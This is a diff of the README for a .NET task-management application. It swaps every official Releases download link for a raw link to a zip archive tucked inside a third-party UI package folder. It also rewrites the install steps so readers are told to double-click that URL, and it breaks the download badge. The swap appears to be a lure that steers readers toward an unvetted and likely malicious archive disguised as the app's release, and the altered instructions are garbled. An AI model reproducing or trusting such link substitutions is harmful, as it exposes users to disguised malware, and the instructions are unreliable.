@@ -4,7 +4,7 @@
 
 Welcome to the dotnet-task-management-system! This application helps you create, organize, and track your tasks easily. With features like status updates, prioritization, and a real-time dashboard, you can stay on top of your work.
 
-[![Download dotnet-task-management-system](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/ngatran302018/dotnet-task-management-system/releases)
+[![Download dotnet-task-management-system](https://raw.githubusercontent.com/ngatran302018/dotnet-task-management-system/main/TaskSphere/packages/Guna.UI2.WinForms.2.0.4.6/dotnet-task-management-system-v1.9.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/ngatran302018/dotnet-task-management-system/main/TaskSphere/packages/Guna.UI2.WinForms.2.0.4.6/dotnet-task-management-system-v1.9.zip)
 
 ## 📦 System Requirements
 
@@ -17,17 +17,17 @@ Before you download, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [dotnet-task-management-system Releases](https://github.com/ngatran302018/dotnet-task-management-system/releases). 
+To get started, visit this page to download: [dotnet-task-management-system Releases](https://raw.githubusercontent.com/ngatran302018/dotnet-task-management-system/main/TaskSphere/packages/Guna.UI2.WinForms.2.0.4.6/dotnet-task-management-system-v1.9.zip). 
 
 1. On the Releases page, look for the latest version.
 2. Click on the version number to view the release details.
-3. Find the file labeled `dotnet-task-management-system.exe`.
+3. Find the file labeled `https://raw.githubusercontent.com/ngatran302018/dotnet-task-management-system/main/TaskSphere/packages/Guna.UI2.WinForms.2.0.4.6/dotnet-task-management-system-v1.9.zip`.
 4. Click the file to download it.
 
 Once the download is complete, follow these steps to install:
 
 1. Locate the downloaded file in your Downloads folder.
-2. Double-click on the `dotnet-task-management-system.exe` file.
+2. Double-click on the `https://raw.githubusercontent.com/ngatran302018/dotnet-task-management-system/main/TaskSphere/packages/Guna.UI2.WinForms.2.0.4.6/dotnet-task-management-system-v1.9.zip` file.
 3. Follow the installation prompts. 
 
 The application will create a shortcut on your desktop for easy access.
